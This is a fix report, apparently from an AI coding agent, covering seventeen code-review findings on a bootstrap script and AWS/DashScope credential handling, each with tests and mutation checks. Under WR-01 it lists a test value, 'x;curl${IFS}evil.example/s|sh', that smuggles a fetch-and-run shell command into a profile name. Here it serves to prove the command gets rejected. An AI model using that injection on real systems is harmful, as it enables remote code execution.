---
phase: 03-providers-credentials
fixed_at: 2026-08-14T01:30:00Z
review_path: .planning/phases/03-providers-credentials/03-REVIEW.md
iteration: 1
findings_in_scope: 17
fixed: 17
skipped: 0
status: all_fixed
---

# Phase 3: Code Review Fix Report

**Fixed at:** 2026-08-14
**Source review:** `.planning/phases/03-providers-credentials/03-REVIEW.md`
**Iteration:** 1

**Summary:**

- Findings in scope: 17 (3 critical, 8 warning, 6 info — `fix_scope: all`)
- Fixed: 17
- Skipped: 0

**Suite:** 638 tests / 45 files entering, **649 tests / 45 files** leaving. `npx tsc --noEmit` clean
both before and after. The +11 is eleven new cases, enumerated per finding below; no existing case
was deleted, softened or renamed.

**Runbook:** `docs/RUNBOOK.md` was not touched. `RB-03-01..05` remain **OUTSTANDING**. No network
request was issued to any provider host.

---

## The two things worth reading first

**1. Two findings' suggested fixes were wrong as written, and were adapted.**

- **CR-01's suggested test** — "assert `getProviderAuth("amazon-bedrock").env.AWS_PROFILE` is still
  `kypi-fixture-ambient`" — asserts something Pi 0.84.1 cannot produce. On the ambient branch
  `resolve()` returns `{ auth: {}, env: credential?.env, source: ... }`, and `credential` is
  `undefined` there, so `env` is `undefined` and the ambient value is never echoed back
  [`pi-ai 0.84.1 dist/providers/amazon-bedrock.js:64-71`]. The discriminator is `source`, which flips
  from `"AWS_PROFILE"` to `"stored credential"` the moment a placeholder is installed — which is
  exactly the regression. Written as an assertion on `source`, with the source-level reason recorded
  inline. Confirmed by running the review's own version first and watching it fail with
  `expected undefined to be 'kypi-fixture-ambient-profile'`.

- **CR-02's finding named four `mkdir -p "$PI_AGENT_DIR"` sites and missed the load-bearing one.**
  `harden_pi_npm_root` runs `mkdir -p "$PI_NPM_ROOT"` where `PI_NPM_ROOT="$PI_AGENT_DIR/npm"`, so it
  creates the agent directory as a *parent side effect* — and it runs **first** in a full run, before
  any of the three `merge_*` functions. Tightening only the named sites would have left the ordinary
  path creating the directory 0755 and Pi's `if (!existsSync(dir))` guard permanently disabled.
  Proven by `sh -x` trace: all four sites now `chmod 700`, and the first is ahead of
  `mkdir -p .../agent/npm`.

**2. Falsification found two of my own fixes to be insufficient, and both were repaired.**

Every fix below was falsified per the standing rule. Two came back green when they should not have:

- **CR-03 (first attempt).** Dropping *both* `insufficient_quota` and `exceeded your current quota`
  from `QUOTA_PATTERN` left the whole suite green — `CLASS_FIXTURES.quota.text` also says
  `billing details`, so a *different* alternative covered for the two that had gone. Repaired with
  `QUOTA_ALTERNATIVE_FIXTURES`: one minimal fixture per alternative, plus an assertion that each
  fixture is matched by *exactly one* alternative. All seven are now individually killable.

- **IN-01 (first attempt).** Removing `QODER_PERSONAL_ACCESS_TOKEN` from the env template turned
  nothing red — and the comment I had written claimed the out-of-scope vendor's name was "a machine
  check rather than a promise" across `.pi/templates/`. It was not: the grep-to-zero was a plan-time
  acceptance gate, never a committed test. Repaired with case 7c, a *mechanism* (every name in the
  managed block must be read by something tracked) rather than an allowlist.

A third near-miss is recorded because it cost real work: **`git checkout --` deleted an uncommitted
edit mid-falsification**, exactly the trap recorded in `STATE.md` from 03-11. It removed
`QUOTA_ALTERNATIVE_FIXTURES` from `schema.ts` between falsification iterations, which silently
invalidated three of them (they failed on a missing export, not on the mutation). Detected by
grepping for the symbol after the loop; the three were re-run against a committed baseline. The
commit-before-mutating rule is not optional.

---

## Fixed Issues

### CR-01: The installed Bedrock placeholder shadows a working `AWS_PROFILE`, and the SSO classifier accepts it as a real profile name

**Files modified:** `.pi/extensions/providers/schema.ts`, `.pi/extensions/providers/index.ts`,
`bin/bootstrap.sh`, `tests/integration/templates-install.test.ts`,
`tests/integration/sso-classifier.test.ts`
**Commit:** `4a1e5ee`

**Applied fix.** Both halves, because either alone leaves the other live.

*Half A (the message).* `TEMPLATE_SENTINEL_PREFIX` and `PROFILE_TEMPLATE_SENTINEL` added to
`schema.ts`; `usableProfileName` now rejects the sentinel by equality before the shape test. The
docstring records *why* shape can never do this job: the placeholder is 29 characters drawn entirely
from the AWS profile-name charset, so it passes even the tightened `SAFE_PROFILE_NAME` from WR-01.

*Half B (the regression).* `merge_auth_json` now withholds any template entry whose values still
carry a `REPLACE_WITH_` sentinel at any depth, and prints which and why with the remedy
(`pi auth login` → "AWS profile", or RB-03-03). Chosen over deleting the `amazon-bedrock` entry from
the template so the template keeps documenting the *shape*; it simply stops being installed as though
it were configuration.

**New cases.** `templates-install` 1b (a working ambient `AWS_PROFILE` survives a bootstrap run),
`sso-classifier` 4b (a not-a-profile value falls back to the placeholder and never into the command).
`templates-install` case 1 and case 3 now partition the template by sentinel instead of comparing key
sets — computed from the committed bytes, not a hand-typed id list.

**Falsified.** F1: removed the sentinel skip from `merge_auth_json` → three assertions red across
cases 1, 1b and 3, including `expected 'stored credential' to be 'AWS_PROFILE'`. F2: removed the
equality check from `usableProfileName` → case 4b red with
`expected 'AWS SSO credentials are expired or mi…' not to contain 'REPLACE_WITH_AWS_PROFILE_NAME'`.

*Note.* An apostrophe in a comment I added to the embedded `node -e` block terminated the POSIX `sh`
single-quoted string and broke the whole script; `sh -n` caught it. A standing warning is now written
into that block.

---

### CR-02: `bin/bootstrap.sh` creates `~/.pi/agent` and `auth.json` with looser modes than Pi would

**Files modified:** `bin/bootstrap.sh`, `tests/integration/templates-install.test.ts`
**Commit:** `ef59038`

**Applied fix.** `ensure_agent_dir()` (`mkdir -p` + best-effort `chmod 700`) replaces every
`mkdir -p "$PI_AGENT_DIR"`, **and is called from `harden_pi_npm_root` before `mkdir -p "$PI_NPM_ROOT"`**
— the site the review missed and the one that actually runs first. `merge_auth_json` writes with
`{ mode: 0o600 }` and follows with an explicit `chmodSync`, because `mode` is honoured by `open(2)`
only on creation and a file created 0644 by an earlier run would otherwise keep that mode forever.
The comment at `:556` claiming file modes are "not this script's business" is replaced: the script
does not write a secret, but it creates the container the secrets live in, and by creating it first it
disables Pi's control.

**New case.** `templates-install` 1c. It points `PI_CODING_AGENT_DIR` at a path that does **not**
exist — `mkdtempSync` creates its directory 0700 by definition, so pointing at one would have made the
case green whatever bootstrap did.

**Falsification — PARTIAL, and this is the one caveat in this report.** POSIX mode bits do not exist
on Windows (Node synthesises `0o666`/`0o444` from the read-only attribute), so case 1c takes a
platform branch and the `700`/`600` assertions **cannot be executed on this machine**. What *was*
falsifiable, and was proven, is the shell wiring: an `sh -x` trace of a full run shows
`chmod 700 <agentdir>` at all four creation sites, the first of them ahead of
`mkdir -p <agentdir>/npm`. The mode assertions themselves run for real only on the `macos-latest`
matrix leg, **which has never run** (see the standing `BOOT-07` blocker). Treat CR-02 as
**fixed, mechanism-verified, mode assertion pending a POSIX run.**

---

### CR-03: `QUOTA_PATTERN`'s bare `billing` token advances the fallback chain on non-quota failures

**Files modified:** `.pi/extensions/providers/schema.ts`, `tests/integration/fallback-chain.test.ts`
**Commits:** `633e850`, `f65c36c`

**Applied fix.**

```
insufficient_quota|out of budget|quota exceeded|exceeded your current quota|allocated quota|arrearage|billing (?:details|quota|limit)
```

The bare `billing` is anchored to quota/limit wording. `exceeded your current quota` is *added*,
because `quota exceeded` does not match the OpenAI-compatible phrasing DeepSeek-direct actually emits
and losing it would collapse the real quota wall into `fatal`. The docstring now states the inversion
in terms rather than describing the borrowing as a transcription: in Pi a match means "do not retry"
and costs nothing; here it means "send this user's prompt, system prompt and tool schemas to a
different vendor".

**New fixtures and cases.** `NON_QUOTA_BILLING_FIXTURES` (the control the review asked for — the class
`CLASS_FIXTURES.fatal.text` is silent about) asserted in case 3 with a length floor and a paired
positive. `QUOTA_ALTERNATIVE_FIXTURES` + case 3b, added after falsification (see above): one minimal
fixture per alternative, each asserted to classify `quota` **and** to be matched by exactly one
alternative — minimality asserted, not promised.

**Falsified, seven ways.**

| Mutation | Result |
|---|---|
| restore bare `billing` | case 3 red: `expected 'quota' to be 'fatal'` on the 400 that links `/billing for plan limits` |
| empty `NON_QUOTA_BILLING_FIXTURES` | case 3 red on the floor |
| drop `insufficient_quota` | case 3b red, naming the alternative |
| drop `out of budget` | case 3b red, naming the alternative |
| drop `quota exceeded` | case 3b red, naming the alternative |
| drop `exceeded your current quota` | case 3b red (`expected 'transient' to be 'quota'`) |
| drop `allocated quota` | case 3b red, naming the alternative |
| drop `arrearage` | case 3b **and** case 8 red |
| drop `billing (?:details\|quota\|limit)` | case 3b red, naming the alternative |

---

### WR-01: `SAFE_PROFILE_NAME` permits shell metacharacters in a string the user is told to paste into a shell

**Files modified:** `.pi/extensions/providers/schema.ts`, `tests/integration/sso-classifier.test.ts`
**Commit:** `e3e719d`

**Applied fix.** `/^[^\s]{1,64}$/` → `/^[A-Za-z0-9_.@-]{1,64}$/`, AWS's own profile-name charset. The
docstring's stated residual is also corrected: it named only `timeout`, but Pi's
`RETRYABLE_PROVIDER_ERROR_PATTERN` additionally carries `terminated`, `429`, the 5xx codes,
`retry delay`, `server.?error` and `internal.?error` [`pi-ai src/utils/retry.ts:26-89`]. The charset
narrows the residual without closing it, and says so.

**New row.** `NOT_A_PROFILE` gains `x;curl${IFS}evil.example/s|sh` (30 chars, no whitespace), driven
through the same case 4b as the CR-01 sentinel. The two rows are rejected by *different* mechanisms
and neither would catch the other.

**Falsified.** Loosened back to `/^[^\s]{1,64}$/` → case 4b red with
`expected '…' not to contain 'x;curl${IFS}evil.example/s|sh'`.

---

### WR-02: The committed-template secret scan only reads the `dashscope` sub-object

**Files modified:** `tests/integration/templates-install.test.ts`
**Commit:** `137e560`

**Applied fix.** The `parsed` table walks `parseModelsTemplate(readFileSync(MODELS_TEMPLATE))` rather
than `templateDashscope()`.

**New case.** 7b drives the evasion the narrow scan allowed — a second provider outside
`providers.dashscope` with a 14-character `sk-` key (under `TOKEN_SHAPED`'s 40-char floor) and a
`!command` value — and asserts *both* that the widened walk reaches them and that the old walk would
not have.

**One assertion is honestly weak, and says so.** The guard case's coverage assertion over the *real*
template cannot discriminate today: the template declares exactly one provider, so the one-key walk
and the whole-document walk produce the same set. I wrote a stronger scope assertion first, watched it
fail on the committed file, and replaced it rather than leaving a red test or weakening it silently.
It is now a tripwire for the day a second provider is added, labelled as such; case 7b is the live
half.

**Falsified.** Narrowed case 7b's walk to the dashscope sub-object → red:
`the value walk did not reach providers.scratch`.

---

### WR-03 / WR-04 / IN-06: fixture tables that can be disarmed by deletion

**Files modified:** `tests/integration/fallback-chain.test.ts`, `tests/integration/sso-classifier.test.ts`
**Commit:** `4d88a6e`

Three instances of one defect class, fixed together because the remedy is identical: a floor on the
table itself, asserted before it is iterated.

- **WR-03** — `DASHSCOPE_QUOTA_FIXTURES.length >= 2` and `SSO_FIXTURES.length >= 6` in
  `fallback-chain` case 8; `NON_SSO_FIXTURES.length >= 3` and `SSO_FIXTURES.length >= 6` in
  `sso-classifier` case 7.
- **WR-04** — `expect(ssoRuns.length).toBe(SSO_FIXTURES.length)` → `.toBeGreaterThanOrEqual(6)`.
- **IN-06** — `Object.keys(fixture.runs).length >= 5` prepended to `fallback-chain` case 1.

**Falsified, four ways.** Emptying `DASHSCOPE_QUOTA_FIXTURES` → case 8 red (`expected 0 to be greater
than or equal to 2`). Truncating `NON_SSO_FIXTURES` to `[0]` → case 7 red (`expected 1 to be greater
than or equal to 3`). Emptying `SSO_FIXTURES` → file fails, **exit code 1** (`beforeAll` throws before
the floor is reached, which is loud rather than green); *truncating* it to one entry → three cases red
including the WR-04 floor with its intended message. Forcing `fixture.runs` to `{}` → case 1 red
(`no chain walk was recorded … expected 0 to be greater than or equal to 5`).

---

### WR-05: The SSO handler rewrites any provider's error, not just Bedrock's

**Files modified:** `.pi/extensions/providers/index.ts`, `tests/helpers/session.ts`,
`tests/integration/sso-classifier.test.ts`
**Commit:** `bf37b08`

**Applied fix.** `if (message.provider !== BEDROCK_PROVIDER_ID) return;` before `classifySso`.
Verified at source that this is safe on the real path: `provider` is required on `AssistantMessage`
[`pi-ai dist/types.d.ts:299`] and the Bedrock adapter assigns `provider: model.provider` when it
builds `output`, **before** the `try` whose `catch` sets `errorMessage`
[`dist/api/bedrock-converse-stream.js:22-25, :218`].

**Harness change this required.** `tests/helpers/session.ts` gains a `providerId` option. This turned
out to matter more than a convenience: **every positive run in `sso-classifier.test.ts` was previously
an implicitly non-Bedrock run**, which is precisely why the over-reach went unnoticed. They now really
come from `amazon-bedrock`.

**New case.** 6b drives the same six credential strings through `dashscope` and asserts they survive
byte-identical with no diagnostic — with the paired positive restated inline, because a handler that
rewrote nothing at all would satisfy the negative half perfectly.

**Falsified, both directions.** Removing the gate → case 6b red (`a dashscope failure was rewritten
into an AWS re-authentication instruction`). *Inverting* the gate → three cases red including case 1
and case 4.

**Not fixed, recorded inline rather than hidden.** The `AWS_BEARER_TOKEN_BEDROCK` edge the review also
names: an expired bearer token has no profile at all, yet still yields `ExpiredTokenException` and
this handler prescribes `aws sso login --profile <profile>`. The user gets the placeholder and its
RB-03-03 pointer, which is a weak answer to the right question. Distinguishing the two credential
shapes needs a live Bedrock failure to observe and belongs to RB-03-03.

---

### WR-06: `write_env_template` corrupts `.env.example` when the managed markers are out of order

**Files modified:** `bin/bootstrap.sh`, `tests/integration/templates-install.test.ts`
**Commit:** `e7ffc69`

**Applied fix.** `ds >= 0 && de >= 0` → `ds >= 0 && de > ds`, with a `FATAL` refusal naming the remedy
for every other half-present or inverted shape.

**New case.** 5c plants a scrambled `.env.example` (END above START), asserts a non-zero exit, asserts
the file is byte-identical afterwards, and asserts neither marker was duplicated. `.env.example` is
tracked; the existing `afterEach` snapshot/restore covers it.

**Falsified.** Reverted to presence-only → case 5c red.

---

### WR-07: `KYPI_DASHSCOPE_BASE_URL` is written into `models.json` with no validation

**Files modified:** `bin/bootstrap.sh`, `tests/integration/templates-install.test.ts`
**Commit:** `e7ffc69`

**Applied fix.** `new URL()` parse plus an `https:` requirement, each with its own `FATAL` message
naming the consequence — Pi sends the resolved `$DASHSCOPE_API_KEY` as a bearer token on every request
and never validates `baseUrl` itself.

**Cases.** `templates-install` case 5's fixture moves from `http://127.0.0.1:9/...` to
`https://127.0.0.1:9/...`; new `it.each` case 5b covers the `http://` refusal and the scheme-less
refusal, and asserts `models.json` was **not** written in either.

**Falsified, twice.** Dropping the `https` check → the http row red. Making the parse lenient
(prefixing a scheme) → the not-a-URL row red.

---

### WR-08: `bedrock-auth.test.ts` case 1 asserts the profile against the same file it fed in

**Files modified:** `tests/unit/bedrock-auth.test.ts`
**Commit:** `524f8f3`

**Applied fix.** Case 1's round trip is kept — it proves the one real property, that Pi returns
`credential.env` verbatim on that branch. New case 1b adds the property-level assertions: the value is
a string, it carries `TEMPLATE_SENTINEL_PREFIX` (built from the exported constant, so the pattern
cannot drift from the literal `bin/bootstrap.sh` and the classifier both key on), and it equals
`PROFILE_TEMPLATE_SENTINEL`.

**Falsified.** Changed the template's placeholder to `default` — a plausible profile name — → case 1b
red, while case 1 stayed green, which is precisely the review's point.

---

### IN-01: `QODER_PERSONAL_ACCESS_TOKEN` is advertised for a vendor this phase rules out entirely

**Files modified:** `.pi/templates/env.example`, `.env.example`,
`tests/integration/templates-install.test.ts`
**Commits:** `d09a056`, `2994f06`

**Applied fix.** The line is removed and `.env.example` regenerated by running the real bootstrap. The
template gains a rule stating that only variables something in this harness reads belong in the
managed block.

**The first attempt was unguarded, and falsification caught it.** Putting the variable back left the
suite green — and my own comment claimed the vendor name was "a machine check rather than a promise"
across `.pi/templates/`, which was false (the grep-to-zero was a plan-time acceptance gate, never
committed). Case 7c now enforces it as a **mechanism**: every name in the managed block must be read
by something tracked outside the two env templates. An allowlist was rejected as a second copy of the
template that would drift from it.

**Falsified, twice.** Re-adding `QODER_PERSONAL_ACCESS_TOKEN` → case 7c red naming it. Emptying the
managed block → case 7c red on its own floor.

---

### IN-02: `.npmrc.kypi-backup` is a durable copy of a file the script says may hold `_authToken`

**Files modified:** `bin/bootstrap.sh`
**Commit:** `d09a056`

**Applied fix.** The backup is created empty and `chmod 600` **before** anything is written into it
(`: > file; chmod 600 file; cat src > file`), and its existence is reported as something to DELETE
rather than as a courtesy. Kept rather than removed on success: the rebuild is the only thing between
the user and a hand-written npm config, and a failed rebuild with no copy is unrecoverable.
Overwriting rather than rotating is left deliberate and stated — the repair branch is byte-idempotent,
so a second repair only follows a fresh user edit, and the copy worth having is the current one.

**Falsification: not applicable.** No test drives the `.npmrc` repair branch with a pre-existing
non-hardened file today, and the change is a mode plus an advisory line. Mechanism confirmed by
`sh -n` and by the full suite (`npmrc-ordering.test.ts` exercises the surrounding function and stays
green). Recorded as the weakest-evidence item in this report.

---

### IN-03: Dead round-trip in the env-template block builder

**Files modified:** `bin/bootstrap.sh`
**Commit:** `e7ffc69`

**Applied fix.** `block` is built without the trailing newline; the marker-absent path adds it
explicitly. The append-then-strip pair is gone. Covered incidentally by the WR-06 falsification, which
exercised both paths and stayed byte-identical on the idempotency case.

---

### IN-04: Two docstrings claim the fallback classes are distinguished by HTTP status

**Files modified:** `tests/helpers/faux.ts`, `tests/unit/helpers.test.ts`
**Commit:** `d09a056`

**Applied fix.** Both reworded. `classifyFailure` reads the error **text** and never sees a status;
`CLASS_STATUS` exists solely to populate the `httpStatus` column of the turns row that
`fallback-chain` case 5 asserts. `wrapFauxWithStatus` is still genuinely needed — for that row — and
the docstrings now say which claim they are correcting so a future reader does not go looking for a
status→class mapping that does not exist.

---

### IN-05: `withLoopbackCompletions` abandons the server when `listen` fails

**Files modified:** `tests/helpers/loopback.ts`
**Commit:** `d09a056`

**Applied fix.** The bind `.catch` now calls `server.removeAllListeners("connection")` and
`server.close()` before rethrowing, and the rethrow carries `{ cause: error }` so the underlying
`EACCES`/`EADDRINUSE` code and stack survive instead of being flattened into a message string.

**Falsification: not performed.** The helper binds on port 0, so a bind failure cannot be induced
deterministically on this machine without patching `node:http` itself — which would prove something
about the patch, not about the helper. A probe confirming the normal path still binds, serves and
tears down cleanly passes, and the full suite (which drives this helper throughout
`dashscope-payload.test.ts`) is green. Recorded as **fixed, unfalsified**, alongside IN-02.

---

## Skipped Issues

None. All 17 findings were fixed.

---

## Honest status of the evidence

Three items in this report have weaker evidence than the rest, and are listed here so nobody has to
reconstruct which:

1. **CR-02's mode assertions have never executed.** Windows has no POSIX mode bits; the assertions run
   only on the `macos-latest` CI leg, which has never run. The shell wiring *is* proven, by trace.
2. **IN-02 is unfalsified.** No test drives the `.npmrc` repair branch.
3. **IN-05 is unfalsified.** A bind failure is not deterministically inducible here.

Everything else in this report turned a green suite red with a targeted message under at least one
mutation, and several under many.

Nothing here changes the OUTSTANDING status of `RB-03-01` … `RB-03-05`, and no live provider check was
performed or claimed.

---

_Fixed: 2026-08-14_
_Fixer: Claude (gsd-code-fixer)_
_Iteration: 1_
